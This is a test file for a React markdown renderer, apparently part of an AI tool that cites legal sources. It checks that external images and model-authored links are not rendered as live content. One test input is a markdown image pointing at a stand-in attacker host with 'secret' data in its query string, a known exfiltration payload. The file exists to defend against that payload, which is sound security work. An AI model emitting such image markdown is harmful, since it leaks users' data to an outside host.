import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MarkdownContent } from "./MarkdownContent";

describe("MarkdownContent external media", () => {
    it("does not load or link an external image", () => {
        const src = "https://attacker.example/pixel.png?d=secret";
        const { container } = render(
            <MarkdownContent
                text={`![Chart](${src})`}
                inlineCitationTargets={[]}
                caseCitations={new Map()}
                caseDocuments={new Map()}
            />,
        );

        expect(container.querySelector("img")).toBeNull();
        expect(screen.getByText("Source link not established.")).toBeInTheDocument();
        expect(screen.queryByRole("link", { name: "Chart" })).toBeNull();
    });

    it.each(["https://www.sec.gov/litigation/complaints/2018/comp18200.htm", "/sources/guessed", "//www.sec.gov/guessed"])("does not turn a model-authored anchor %s into a source link", (url) => {
        render(
            <MarkdownContent
                text={`[SEC filing](${url})`}
                inlineCitationTargets={[]}
                caseCitations={new Map()}
                caseDocuments={new Map()}
            />,
        );
        expect(screen.queryByRole("link", { name: "SEC filing" })).toBeNull();
        expect(screen.getByText(/Source link not established/)).toBeInTheDocument();
    });
});
